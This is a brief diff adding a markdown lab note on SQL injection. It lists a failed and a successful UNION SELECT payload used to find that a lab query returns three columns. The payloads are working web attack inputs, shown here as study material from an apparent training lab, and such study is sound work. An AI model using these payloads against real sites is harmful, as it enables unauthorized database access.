@@ -1,0 +1,13 @@
+Payloads Used:
+
+1. Initial Attempt (Failure):
+```sql
+'+UNION+SELECT+NULL--
+```
+
+2. Final Successful Payload:
+```sql
+'+UNION+SELECT+NULL,NULL,NULL--
+```
+
+-> (Note: In this specific lab, the query returns 3 columns.)
